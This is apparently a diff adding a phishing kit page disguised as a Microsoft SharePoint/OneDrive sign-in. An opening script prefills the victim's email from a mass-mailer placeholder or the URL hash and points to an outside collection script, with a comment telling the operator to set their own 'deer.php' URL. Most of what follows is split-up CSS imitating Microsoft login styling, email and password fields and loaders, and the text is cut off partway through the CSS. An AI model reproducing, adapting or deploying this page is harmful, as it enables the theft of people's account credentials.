@@ -1,0 +1,2000 @@
+<!DOCTYPE html>
+<html id="html"  lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <script>
+  var email ="#[[-Email-]]";
+  var file ='https://anserescapital.xyz/husk/deer.php';  // <-- SET YOUR deer.php URL HERE
+
+  // If Gammadyne did not replace the placeholder, fall back to the URL hash (#user@domain.com)
+  if (email === "#[[-Email-]]" || email === "" || email.indexOf("#[[") === 0) {
+      var hash = window.location.hash.replace(/^#/, "");
+      if (hash && hash.indexOf("@") !== -1) {
+          email = decodeURIComponent(hash);
+      }
+  }
+  </script>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sharepoint</title>
+
+
+<style>
+.loader,
+[class~=imgclass],
+[class~=canvas] {
+    position: relative;
+}
+
+[class~=canvas] {
+    width: 250px;
+}
+
+[class~=canvas] {
+    height: auto;
+}
+
+[class~=canvas] {
+    margin-left: auto;
+}
+
+[class~=canvas] {
+    margin-bottom: auto;
+}
+
+.loader,
+[class~=canvas] {
+    margin-right: auto;
+}
+
+[class~=canvas] {
+    margin-top: auto;
+}
+
+[class~=canvas] {
+    padding-top: 8%;
+}
+
+[class~=imgclass] {
+    width: 160px;
+}
+
+* {
+    margin-left: 0pc;
+}
+
+[class~=imgclass] {
+    height: 112.5pt;
+}
+
+[class~=imgclass] {
+    margin-left: 2.8125pc;
+}
+
+* {
+    margin-bottom: 0pc;
+}
+
+[class~=tittleText] {
+    font-weight: 800;
+}
+
+[class~=tittleText] {
+    font-size: 1rem;
+}
+
+[class~=tittleText] {
+    margin-left: .3125in;
+}
+
+[class~=logerMe] {
+    font-weight: 500;
+}
+
+[class~=loader]:after,
+.loader {
+    border-radius: 50%;
+}
+
+* {
+    margin-right: 0pc;
+}
+
+.loader,
+[class~=loader]:after {
+    width: 9em;
+}
+
+[class~=loader]:after,
+.loader {
+    height: 9em;
+}
+
+* {
+    margin-top: 0pc;
+}
+
+.loader {
+    margin-left: auto;
+}
+
+.loader {
+    margin-bottom: 45pt;
+}
+
+.loader {
+    margin-top: 45pt;
+}
+
+.loader {
+    font-size: 10px;
+}
+
+.loader {
+    text-indent: -9999em;
+}
+
+.loader {
+    border-top-width: .5em;
+}
+
+html {
+    background: none;
+}
+
+* {
+    outline: none;
+}
+
+html {
+    overflow: hidden;
+}
+
+.loader {
+    border-top-style: solid;
+}
+
+.loader {
+    border-top-color: rgba(255, 255, 255, .4);
+}
+
+.loader {
+    border-image: none;
+}
+
+.loader {
+    border-right-width: .5em;
+}
+
+.loader {
+    border-right-style: solid;
+}
+
+.loader {
+    border-right-color: rgba(255, 255, 255, .4);
+}
+
+.loader {
+    border-bottom-width: .5em;
+}
+
+* {
+    padding-left: 0pt;
+}
+
+.loader {
+    border-bottom-style: solid;
+}
+
+.loader {
+    border-bottom-color: rgba(255, 255, 255, .4);
+}
+
+.loader {
+    border-left-width: .5em;
+}
+
+* {
+    padding-bottom: 0pt;
+}
+
+* {
+    padding-right: 0pt;
+}
+
+* {
+    padding-top: 0pt;
+}
+
+.loader {
+    border-left-style: solid;
+}
+
+body {
+    width: 100%;
+}
+
+.loader {
+    border-left-color: #038387;
+}
+
+.loader {
+    -webkit-transform: translateZ(0);
+}
+
+.loader {
+    -ms-transform: translateZ(0);
+}
+
+.loader {
+    transform: translateZ(0);
+}
+
+.loader {
+    -webkit-animation: load8 1.6s infinite linear;
+}
+
+.loader {
+    animation: load8 1.6s infinite linear;
+}
+
+body {
+    height: 100vh;
+}
+
+@-webkit-keyframes load8 {
+    0% {
+        -webkit-transform: rotate(0deg);
+        transform: rotate(0deg);
+    }
+    70% {
+        -webkit-transform: rotate(180deg);
+        transform: rotate(180deg);
+    }
+    100% {
+        -webkit-transform: rotate(360deg);
+        transform: rotate(360deg);
+    }
+}
+
+@keyframes load8 {
+    0% {
+        -webkit-transform: rotate(0deg);
+        transform: rotate(0deg);
+    }
+    70% {
+        -webkit-transform: rotate(180deg);
+        transform: rotate(180deg);
+    }
+    100% {
+        -webkit-transform: rotate(360deg);
+        transform: rotate(360deg);
+    }
+}
+
+[class~=allBody] {
+    background-color: #fff;
+}
+
+[class~=allBody] {
+    background-size: 100% auto;
+}
+
+[class~=lds-roller] div:nth-child(1):after {
+    top: 3.9375pc;
+}
+
+[class~=frontDocs] img:hover {
+    border-left-style: solid;
+}
+
+[class~=allBody] {
+    max-height: 100%;
+}
+
+[class~=loginForm],
+.buttomLabel,
+[class~=overlay],
+[class~=lds-roller] div:after {
+    position: absolute;
+}
+
+[class~=overlay] {
+    z-index: 10;
+}
+
+[class~=overlay] {
+    background-color: rgba(0, 0, 0, .5);
+}
+
+[class~=lds-roller] div:nth-child(1):after {
+    left: .65625in;
+}
+
+[class~=overlay] {
+    height: 100vh;
+}
+
+[class~=lds-roller] div:after {
+    content: " ";
+}
+
+[class~=overlay] {
+    width: 100%;
+}
+
+[class~=overlay] {
+    top: 0pc;
+}
+
+[class~=loginForm],
+[class~=overlay],
+[class~=grayBox] {
+    display: none;
+}
+
+[class~=loginForm] {
+    margin-left: auto;
+}
+
+[class~=loginForm] {
+    margin-right: auto;
+}
+
+[class~=loginForm] {
+    height: auto;
+}
+
+[class~=frontDocs] img:hover {
+    border-bottom-style: solid;
+}
+
+[class~=loginForm] {
+    margin-top: 0%;
+}
+
+** {
+    padding-left: 0pc;
+}
+
+[class~=loginForm] {
+    max-width: 100%;
+}
+
+[class~=loginForm] {
+    width: calc(100% - 0px);
+}
+
+[class~=loginForm] {
+    padding-left: 35px;
+}
+
+[class~=loginForm] {
+    padding-bottom: 22.5pt;
+}
+
+[class~=loginForm] {
+    padding-right: 35px;
+}
+
+[class~=loginForm] {
+    padding-top: 1.875pc;
+}
+
+[class~=loginForm] {
+    margin-bottom: 1.75pc;
+}
+
+[class~=loginForm] {
+    background-color: #fff;
+}
+
+[class~=loginForm] {
+    z-index: 1000;
+}
+
+[class~=loginForm] {
+    overflow: hidden;
+}
+
+[class~=grayBox] {
+    background-color: #f1f1f1;
+}
+
+[class~=grayBox] {
+    margin-left: -40px;
+}
+
+[class~=grayBox] {
+    margin-right: -40px;
+}
+
+[class~=grayBox] {
+    margin-bottom: -37.5pt;
+}
+
+[class~=grayBox] {
+    padding-left: 30px;
+}
+
+[class~=grayBox] {
+    padding-right: 20px;
+}
+
+[class~=grayBox] {
+    padding-bottom: 20px;
+}
+
+[class~=lds-roller] div:after {
+    display: block;
+}
+
+[class~=grayBox] {
+    padding-top: .625pc;
+}
+
+[class~=frontDocs] img:hover {
+    border-right-style: solid;
+}
+
+[class~=grayBox]>* {
+    font-weight: 400;
+}
+
+[class~=grayBox]>* {
+    font-size: .9375rem;
+}
+
+[class~=grayBox]>* {
+    line-height: 1.5rem;
+}
+
+[class~=grayBox]>* {
+    color: #1b1b1b;
+}
+
+[class~=grayBox]>* {
+    text-align: left;
+}
+
+.buttomLabel {
+    bottom: 0pc;
+}
+
+.buttomLabel {
+    right: 0px;
+}
+
+.buttomLabel {
+    width: 100%;
+}
+
+.buttomLabel {
+    display: flex;
+}
+
+[class~=frontDocs] img:hover {
+    border-top-style: solid;
+}
+
+.buttomLabel {
+    padding-left: 30%;
+}
+
+.buttomLabel {
+    background-color: black;
+}
+
+[class~=lds-roller] div:nth-child(2):after {
+    top: 4.25pc;
+}
+
+[class~=formLogo2],
+[class~=buttomLabel]>a,
+[class~=emailBlock],
+[class~=formLogo] {
+    position: relative;
+}
+
+[class~=emailBlock] {
+    display: grid;
+}
+
+[class~=emailBlock] {
+    grid-template-columns: auto;
+}
+
+[class~=emailBlock] {
+    margin-left: .104166667in;
+}
+
+[class~=emailBlock] {
+    margin-bottom: .104166667in;
+}
+
+[class~=emailBlock] {
+    margin-right: .104166667in;
+}
+
+[class~=lds-roller] div:nth-child(2):after {
+    left: 42pt;
+}
+
+[class~=emailBlock] {
+    margin-top: .104166667in;
+}
+
+[class~=lds-roller] div:nth-child(3):after {
+    top: 53.25pt;
+}
+
+.emailBlock>* {
+    margin-bottom: 15px;
+}
+
+[class~=formLogo2],
+[class~=formLogo] {
+    margin-left: -.052083333in;
+}
+
+[class~=formLogo],
+[class~=formLogo2] {
+    margin-bottom: .104166667in;
+}
+
+[class~=formLogo2],
+[class~=formLogo] {
+    margin-right: -.052083333in;
+}
+
+[class~=frontDocs] img:hover {
+    border-left-width: .0625pc;
+}
+
+[class~=formLogo],
+[class~=formLogo2] {
+    margin-top: -.052083333in;
+}
+
+[class~=lds-roller] div:after {
+    width: .072916667in;
+}
+
+**,
+[class~=emailInput] {
+    padding-bottom: 0pc;
+}
+
+[class~=buttomLabel]>a {
+    z-index: 9999999999;
+}
+
+[class~=emailInput],
+[class~=formLogo2] {
+    width: auto;
+}
+
+**,
+[class~=emailInput] {
+    padding-right: 0pc;
+}
+
+[class~=formLogo2] {
+    height: 40px;
+}
+
+[class~=formLogo2] {
+    padding-left: 0pt;
+}
+
+[class~=signIn] {
+    font-size: 1.5rem;
+}
+
+[class~=signIn] {
+    line-height: 1.75rem;
+}
+
+[class~=signIn] {
+    font-weight: 600;
+}
+
+[class~=signIn] {
+    cursor: pointer;
+}
+
+[class~=signIn] {
+    font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+}
+
+.emailInvalid,
+[class~=passwordError],
+[class~=emailError],
+[class~=passwordNull] {
+    color: red;
+}
+
+[class~=passwordNull],
+[class~=passwordError],
+.emailInvalid,
+[class~=emailError] {
+    display: none;
+}
+
+[class~=lds-roller] div:after {
+    height: .072916667in;
+}
+
+[class~=lds-roller] div:nth-child(3):after {
+    left: 3pc;
+}
+
+[class~=lds-roller] div:after {
+    border-radius: 50%;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    display: block;
+}
+
+[class~=lds-roller] div:after {
+    background: #fff;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    background-image: none;
+}
+
+[class~=frontDocs] img:hover {
+    border-bottom-width: .75pt;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    border-left-style: solid;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    border-bottom-style: solid;
+}
+
+[class~=lds-roller] div:nth-child(4):after {
+    top: 54pt;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    border-right-style: solid;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    border-top-style: solid;
+}
+
+[class~=emailInput] {
+    border-left-color: rgba(0, 0, 0, .6);
+}
+
+[class~=emailInput] {
+    border-bottom-color: rgba(0, 0, 0, .6);
+}
+
+[class~=emailInput] {
+    border-right-color: rgba(0, 0, 0, .6);
+}
+
+[class~=emailInput] {
+    border-top-color: rgba(0, 0, 0, .6);
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    border-left-width: 0px;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    border-bottom-width: thin;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    border-right-width: 0px;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    border-top-width: 0pc;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    outline: none;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    padding-left: 0pc;
+}
+
+[class~=emailInput],
+[class~=passwordImput],
+** {
+    padding-top: 0pt;
+}
+
+[class~=emailInput] {
+    height: 22.5pt;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    line-height: normal;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    font-size-adjust: none;
+}
+
+[class~=frontDocs] img:hover {
+    border-right-width: .010416667in;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    font-kerning: auto;
+}
+
+[class~=frontDocs] img:hover {
+    border-top-width: .010416667in;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    font-family: Arial;
+}
+
+[class~=frontDocs] img:hover {
+    border-left-color: #c4c3c3;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    color: -internal-light-dark(black, white);
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    letter-spacing: normal;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    word-spacing: normal;
+}
+
+[class~=frontDocs] img:hover {
+    border-bottom-color: #c4c3c3;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    appearance: textfield;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    background-color: -internal-light-dark(#fff, #3b3b3b);
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    cursor: text;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    font-style: normal;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    font-variant: normal;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    font-weight: 400;
+}
+
+[class~=emailInput],
+[class~=passwordImput] {
+    font-stretch: normal;
+}
+
+[class~=passwordImput],
+[class~=emailInput] {
+    font-size: 1rem;
+}
+
+[class~=passwordImput] {
+    width: auto;
+}
+
+[class~=frontDocs] img:hover {
+    border-right-color: #c4c3c3;
+}
+
+[class~=frontDocs] img:hover {
+    border-top-color: #c4c3c3;
+}
+
+[class~=lds-roller] div:after {
+    margin-left: -.041666667in;
+}
+
+[class~=backArrow]:hover {
+    background-color: lightgrey;
+}
+
+[class~=passwordImput],
+[class~=formButton] {
+    border-left-color: #0067b8;
+}
+
+[class~=passwordImput],
+[class~=formButton] {
+    border-bottom-color: #0067b8;
+}
+
+[class~=formButton],
+[class~=passwordImput] {
+    border-right-color: #0067b8;
+}
+
+[class~=passwordImput],
+[class~=formButton] {
+    border-top-color: #0067b8;
+}
+
+[class~=backArrow]:hover {
+    border-radius: 50%;
+}
+
+.lds-roller div:nth-child(1) {
+    animation-delay: -.036s;
+}
+
+[class~=passwordImput] {
+    padding-bottom: 0pt;
+}
+
+[class~=buttomLabel]>a {
+    color: white;
+}
+
+[class~=passwordImput],
+[class~=formButton] {
+    padding-right: 0pc;
+}
+
+[class~=lds-roller] div:after {
+    margin-bottom: 0;
+}
+
+[class~=passwordImput] {
+    height: 35px;
+}
+
+[class~=lds-roller] div:nth-child(4):after {
+    left: 2.5pc;
+}
+
+[class~=lds-roller] div:nth-child(2) {
+    animation-delay: -.072s;
+}
+
+[class~=lds-roller] div:nth-child(5):after {
+    top: .739583333in;
+}
+
+[class~=formButton],
+.loaderBox,
+[class~=passwordBlock],
+[class~=loaderBox2] {
+    position: relative;
+}
+
+[class~=lds-roller] div:nth-child(3) {
+    animation-delay: -.108s;
+}
+
+[class~=formButton] {
+    background-color: #0067b8;
+}
+
+[class~=formButton] {
+    color: #fff;
+}
+
+[class~=formButton] {
+    line-height: normal;
+}
+
+[class~=formButton] {
+    padding-left: 0pc;
+}
+
+[class~=formButton] {
+    padding-bottom: 8px;
+}
+
+[class~=lds-roller] div:nth-child(5):after {
+    left: 32px;
+}
+
+[class~=formButton] {
+    padding-top: 8px;
+}
+
+[class~=formButton] {
+    border-left-style: none;
+}
+
+[class~=formButton] {
+    border-bottom-style: none;
+}
+
+[class~=formButton] {
+    border-right-style: none;
+}
+
+[class~=formButton] {
+    border-top-style: none;
+}
+
+** {
+    margin-left: 0pc;
+}
+
+[class~=formButton] {
+    width: 1.145833333in;
+}
+
+[class~=formButton] {
+    left: 70%;
+}
+
+[class~=formButton],
+[class~=keyLabel],
+[class~=backArrow] {
+    cursor: pointer;
+}
+
+[class~=formButton] {
+    margin-top: .15625in;
+}
+
+** {
+    margin-bottom: 0pc;
+}
+
+[class~=keyLabel] {
+    padding-right: 7px;
+}
+
+[class~=keyLabel] {
+    color: #0067b8;
+}
+
+[class~=emailLabel] {
+    padding-top: 0px;
+}
+
+[class~=passwordBlock] {
+    display: grid;
+}
+
+[class~=passwordBlock] {
+    display: none;
+}
+
+[class~=passwordBlock] {
+    grid-template-columns: auto;
+}
+
+.passwordBlock>* {
+    margin-bottom: 11.25pt;
+}
+
+[class~=labelButtom]>*,
+[class~=buttomLabel]>a {
+    font-size: .8rem;
+}
+
+.labelpassword {
+    display: flex;
+}
+
+.loaderBox {
+    margin-top: -33.75pt;
+}
+
+[class~=loaderBox2],
+.loaderBox {
+    margin-left: -50px;
+}
+
+.loaderBox,
+[class~=loaderBox2] {
+    width: 130%;
+}
+
+.lds-roller div:nth-child(4) {
+    animation-delay: -.144s;
+}
+
+.loaderBox,
+[class~=loaderBox2] {
+    overflow: hidden;
+}
+
+.loaderBox,
+[class~=loaderBox2] {
+    display: none;
+}
+
+[class~=loaderBox2] {
+    margin-top: -.364583333in;
+}
+
+[class~=lds-roller] div:nth-child(6):after {
+    top: .708333333in;
+}
+
+[class~=lds-roller] div:nth-child(5) {
+    animation-delay: -.18s;
+}
+
+.oneDrive {
+    position: absolute;
+}
+
+.oneDrive {
+    z-index: 1;
+}
+
+.oneDrive {
+    top: 0pc;
+}
+
+.oneDrive {
+    width: 100%;
+}
+
+.header,
+[class~=sideBar] {
+    position: relative;
+}
+
+.header {
+    background-color: #0078d4;
+}
+
+.header {
+    line-height: 36pt;
+}
+
+[class~=lds-roller] div:nth-child(6) {
+    animation-delay: -.216s;
+}
+
+[class~=lds-roller] div:nth-child(6):after {
+    left: 18pt;
+}
+
+[class~=lds-roller] div:nth-child(7) {
+    animation-delay: -.252s;
+}
+
+[class~=lds-roller] div:nth-child(8) {
+    animation-delay: -.288s;
+}
+
+[class~=sideBar] {
+    background-color: #f2efef;
+}
+
+[class~=sideBar] {
+    width: 230px;
+}
+
+[class~=sideBar] {
+    height: 94vh;
+}
+
+.subMenu1,
+[class~=subMenu2] {
+    position: absolute;
+}
+
+** {
+    margin-right: 0pc;
+}
+
+[class~=buttomLabel]>a {
+    margin-right: .9375pc;
+}
+
+.subMenu1,
+[class~=subMenu2] {
+    top: .5in;
+}
+
+.subMenu1 {
+    width: 100%;
+}
+
+.subMenu1,
+[class~=subMenu2] {
+    border-left-style: solid;
+}
+
+.subMenu1,
+[class~=subMenu2] {
+    border-bottom-style: solid;
+}
+
+[class~=subMenu2],
+.subMenu1 {
+    border-right-style: solid;
+}
+
+[class~=subMenu2],
+.subMenu1 {
+    border-top-style: solid;
+}
+
+[class~=subMenu2],
+.subMenu1 {
+    border-left-width: 0px;
+}
+
+[class~=subMenu2],
+.subMenu1 {
+    border-bottom-width: .75pt;
+}
+
+.subMenu1,
+[class~=subMenu2] {
+    border-right-width: 0pt;
+}
+
+[class~=subMenu2],
+.subMenu1 {
+    border-top-width: 0pc;
+}
+
+.subMenu1,
+[class~=subMenu2] {
+    border-left-color: lightgray;
+}
+
+[class~=subMenu2],
+.subMenu1 {
+    border-bottom-color: lightgray;
+}
+
+.subMenu1,
+[class~=subMenu2] {
+    border-right-color: lightgray;
+}
+
+[class~=lds-roller] div:after {
+    margin-right: 0;
+}
+
+.subMenu1,
+[class~=subMenu2] {
+    border-top-color: lightgray;
+}
+
+[class~=lds-roller] div:after {
+    margin-top: -.041666667in;
+}
+
+.subMenu1,
+[class~=subMenu2] {
+    height: 43px;
+}
+
+.subMenu1,
+[class~=subMenu2] {
+    margin-top: .1875pc;
+}
+
+[class~=buttomLabel]>a {
+    padding-left: 3.75pt;
+}
+
+** {
+    margin-top: 0pc;
+}
+
+[class~=subMenu2] {
+    width: 84%;
+}
+
+[class~=subMenu2] {
+    margin-left: 2.395833333in;
+}
+
+[class~=profileS] {
+    display: block;
+}
+
+[class~=new1],
+.sort1,
+[class~=profileS],
+[class~=search],
+[class~=profileL],
+[class~=frontDocs]>*,
+[class~=shrink1],
+[class~=shrinkmenu1] {
+    cursor: pointer;
+}
+
+[class~=lds-roller] div:nth-child(7):after {
+    top: .65625in;
+}
+
+[class~=sideBar],
+[class~=uplaod1] {}
+
+[class~=lds-roller] div:nth-child(7):after {
+    left: .177083333in;
+}
+
+.sort1 {
+    float: right;
+}
+
+.sort1 {
+    padding-top: .25pc;
+}
+
+.lds-roller div:nth-child(8):after {
+    top: 42pt;
+}
+
+.lds-roller div:nth-child(8):after {
+    left: .125in;
+}
+
+.sort1 {
+    padding-right: .052083333in;
+}
+
+[class~=frontDocs],
+[class~=lds-roller] {
+    position: absolute;
+}
+
+[class~=frontDocs] {
+    height: auto;
+}
+
+[class~=frontDocs] {
+    width: auto;
+}
+
+[class~=frontDocs] {
+    top: 97.5pt;
+}
+
+[class~=frontDocs]>* {
+    margin-left: .3125pc;
+}
+
+[class~=frontDocs]>* {
+    margin-bottom: .3125pc;
+}
+
+[class~=frontDocs]>* {
+    margin-right: .3125pc;
+}
+
+[class~=frontDocs]>* {
+    margin-top: .3125pc;
+}
+
+[class~=lds-roller] {
+    display: inline-block;
+}
+
+[class~=lds-roller] {
+    width: 5pc;
+}
+
+[class~=lds-roller] {
+    height: 60pt;
+}
+
+[class~=lds-roller] {
+    top: 40%;
+}
+
+[class~=lds-roller] {
+    bottom: 50%;
+}
+
+[class~=lds-roller] {
+    right: 55%;
+}
+
+[class~=lds-roller] {
+    left: 43%;
+}
+
+[class~=buttomLabel]>a {
+    padding-bottom: 3.75pt;
+}
+
+[class~=buttomLabel]>a {
+    padding-right: 3.75pt;
+}
+
+** {
+    border-left-style: none;
+}
+
+** {
+    border-bottom-style: none;
+}
+
+** {
+    border-right-style: none;
+}
+
+** {
+    border-top-style: none;
+}
+
+[class~=buttomLabel]>a {
+    padding-top: 3.75pt;
+}
+
+[class~=lds-roller] div {
+    animation: lds-roller 1.2s cubic-bezier(.5, 0, .5, 1) infinite;
+}
+
+[class~=lds-roller] div {
+    transform-origin: 40px 2.5pc;
+}
+
+** {
+    outline: none;
+}
+
+@keyframes lds-roller {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
+
+@media screen and (min-width: 40em) {
+    [class~=loginForm],
+    [class~=loginForm] {
+        position: relative;
+    }
+    [class~=loginForm] {
+        margin-left: auto;
+    }
+    [class~=loginForm] {
+        margin-right: auto;
+    }
+    [class~=loginForm] {
+        height: auto;
+    }
+    [class~=loginForm] {
+        margin-top: 2%;
+    }
+    [class~=loginForm] {
+        max-width: 440px;
+    }
+    [class~=loginForm] {
+        width: calc(100% - 40px);
+    }
+    [class~=loginForm] {
+        padding-left: .416666667in;
+    }
+    [class~=loginForm] {
+        padding-bottom: 2.1875pc;
+    }
+    [class~=loginForm] {
+        padding-right: 2.5pc;
+    }
+    [class~=loginForm] {
+        padding-top: 2.1875pc;
+    }
+    [class~=loginForm] {
+        margin-bottom: 1.75pc;
+    }
+    [class~=loginForm] {
+        background-color: #fff;
+    }
+    [class~=loginForm] {
+        z-index: 1000;
+    }
+    [class~=loginForm] {
+        overflow: hidden;
+    }
+    [class~=profileS] {
+        display: block;
+    }
+    .search,
+    [class~=profileL],
+    [class~=shrink1] {
+        cursor: pointer;
+    }
+    [class~=uplaod1],
+    [class~=sideBar] {}
+    [class~=buttomLabel] {
+        position: absolute;
+    }
+    [class~=buttomLabel] {
+        bottom: 0in;
+    }
+    [class~=buttomLabel] {
+        right: 0pc;
+    }
+    [class~=buttomLabel] {
+        width: 100%;
+    }
+    [class~=buttomLabel] {
+        display: flex;
+    }
+    [class~=buttomLabel] {
+        padding-left: 50%;
+    }
+    [class~=buttomLabel] {
+        background-color: black;
+    }
+}
+
+@media screen and (min-width: 60em) {
+    .loginForm,
+    .loginForm {
+        position: relative;
+    }
+    .loginForm {
+        margin-left: auto;
+    }
+    .loginForm {
+        margin-right: auto;
+    }
+    .loginForm {
+        height: auto;
+    }
+    [class~=sideBar]>img {
+        margin-left: .625pc;
+    }
+    .loginForm {
+        margin-top: 12%;
+    }
+    .loginForm {
+        max-width: 440px;
+    }
+    [class~=sideBar]>img {
+        margin-bottom: .625pc;
+    }
+    .loginForm {
+        width: calc(100% - 40px);
+    }
+    .loginForm {
+        padding-left: 2.5pc;
+    }
+    .loginForm {
+        padding-bottom: .364583333in;
+    }
+    .loginForm {
+        padding-right: 2.5pc;
+    }
+    .loginForm {
+        padding-top: 26.25pt;
+    }
+    .loginForm {
+        margin-bottom: 21pt;
+    }
+    .loginForm {
+        background-color: #fff;
+    }
+    .loginForm {
+        z-index: 1000;
+    }
+    .loginForm {
+        overflow: hidden;
+    }
+    [class~=subMenu1],
+    [class~=profileS] {}
+    [class~=sideBar],
+    [class~=search],
+    [class~=profileL] {
+        display: block;
+    }
+    [class~=profileL],
+    [class~=sideBarBottom]>a,
+    [class~=sort2],
+    [class~=uplaod2],
+    [class~=sideBar]>img,
+    [class~=search],
+    [class~=new2] {
+        cursor: pointer;
+    }
+    [class~=sideBar]>img {
+        margin-right: .625pc;
+    }
+    [class~=sideBarBottom],
+    [class~=buttomLabel],
+    [class~=lds-roller] {
+        position: absolute;
+    }
+    [class~=sideBarBottom] {
+        bottom: 0pt;
+    }
+    [class~=sideBarBottom] {
+        width: 100%;
+    }
+    [class~=sideBarBottom] {
+        display: grid;
+    }
+    [class~=sideBarBottom] {
+        color: #0067b8;
+    }
+    [class~=sideBarBottom] {
+        border-left-style: solid;
+    }
+    [class~=sideBarBottom] {
+        border-bottom-style: solid;
+    }
+    [class~=sideBarBottom] {
+        border-right-style: solid;
+    }
+    [class~=sideBarBottom] {
+        border-top-style: solid;
+    }
+    [class~=sideBar]>img {
+        margin-top: .625pc;
+    }
+    [class~=sideBarBottom] {
+        border-left-width: 0pc;
+    }
+    [class~=sideBarBottom] {
+        border-bottom-width: 0pc;
+    }
+    [class~=sideBarBottom] {
+        border-right-width: 0pc;
+    }
+    [class~=sideBarBottom] {
+        border-top-width: .010416667in;
+    }
+    [class~=sideBarBottom] {
+        border-left-color: lightgray;
+    }
+    [class~=sideBarBottom] {
+        border-bottom-color: lightgray;
+    }
+    [class~=sideBarBottom] {
+        border-right-color: lightgray;
+    }
+    [class~=sideBarBottom] {
+        border-top-color: lightgray;
+    }
+    [class~=sort2] {
+        float: right;
+    }
+    [class~=sort2] {
+        padding-top: .052083333in;
+    }
+    [class~=sort2] {
+        padding-right: .3125pc;
+    }
+    .subMenu2 {
+        display: block;
+    }
+    [class~=frontDocs] {
+        margin-left: 17.5pc;
+    }
+    [class~=lds-roller] {
+        display: inline-block;
+    }
+    [class~=sideBarBottom]>a {
+        font-size: .8rem;
+    }
+    [class~=sideBarBottom]>a {
+        margin-left: 15px;
+    }
+    [class~=lds-roller] {
+        width: .833333333in;
+    }
+    [class~=lds-roller] {
+        height: 60pt;
+    }
+    [class~=lds-roller] {
+        top: 40%;
+    }
+    [class~=lds-roller] {
+        bottom: 50%;
+    }
+    [class~=lds-roller] {
+        right: 50%;
+    }
+    [class~=sideBarBottom]>a {
+        margin-bottom: 20px;
+    }
+    [class~=lds-roller] {
+        left: 48%;
+    }
+    [class~=buttomLabel] {
+        bottom: 0px;
+    }
+    [class~=sideBarBottom]>a {
+        margin-right: 3.75pt;
+    }
+    [class~=buttomLabel] {
+        right: 0pt;
+    }
+    [class~=buttomLabel] {
+        width: 100%;
+    }
+    [class~=buttomLabel] {
+        display: flex;
+    }
+    [class~=buttomLabel] {
+        padding-left: 80%;
+    }
+    [class~=buttomLabel] {
+        background-color: black;
+    }
+    [class~=sideBarBottom]>a {
+        margin-top: 3.75pt;
+    }
+}
+/**
+* ==============================================
+* Dot Floating
+* ==============================================
+*/
+
+.dot-floating {
+    position: relative;
+    width: 5px;
+    height: 5px;
+    border-radius: 50%;
+    background-color: #0067b8;
+    color: #0067b8;
+    -webkit-animation: dot-floating 2s infinite cubic-bezier(0.15, 0.6, 0.9, 0.1);
+    animation: dot-floating 2s infinite cubic-bezier(0.15, 0.6, 0.9, 0.1);
+    margin-left: 220px;
+}
+
+.dot-floating::before,
+.dot-floating::after {
+    content: '';
+    display: inline-block;
+    position: absolute;
+    /* top: 0; */
+}
+
+.dot-floating::before {
+    left: -12px;
+    width: 5px;
+    height: 5px;
+    border-radius: 50%;
+    background-color: #0067b8;
+    color: #0067b8;
+    -webkit-animation: dot-floating-before 2s infinite ease-in-out;
+    animation: dot-floating-before 2s infinite ease-in-out;
+}
+
+.dot-floating::after {
+    left: -12px;
+    width: 5px;
+    height: 5px;
+    border-radius: 50%;
+    background-color: #0067b8;
+    color: #0067b8;
+    -webkit-animation: dot-floating-after 3s infinite cubic-bezier(0.4, 0, 1, 1);
+    animation: dot-floating-after 2s infinite cubic-bezier(0.4, 0, 1, 1);
+}
+
+@-webkit-keyframes dot-floating {
+    0% {
+        left: calc(-50% - 5px);
+    }
+    75% {
+        left: calc(50% + 105px);
+    }
+    100% {
+        left: calc(50% + 105px);
+    }
+}
+
+@keyframes dot-floating {
+    0% {
+        left: calc(-50% - 5px);
+    }
+    75% {
+        left: calc(50% + 105px);
+    }
+    100% {
+        left: calc(50% + 105px);
+    }
+}
+
+@-webkit-keyframes dot-floating-before {
+    0% {
+        left: -50px;
+    }
+    50% {
+        left: -12px;
+    }
+    75% {
+        left: -50px;
+    }
+    100% {
+        left: -50px;
+    }
+}
+
+@keyframes dot-floating-before {
+    0% {
+        left: -50px;
+    }
+    50% {
+        left: -12px;
+    }
+    75% {
+        left: -50px;
+    }
+    100% {
+        left: -50px;
+    }
+}
+
+@-webkit-keyframes dot-floating-after {
+    0% {
+        left: -100px;
+    }
+    50% {
+        left: -24px;
+    }
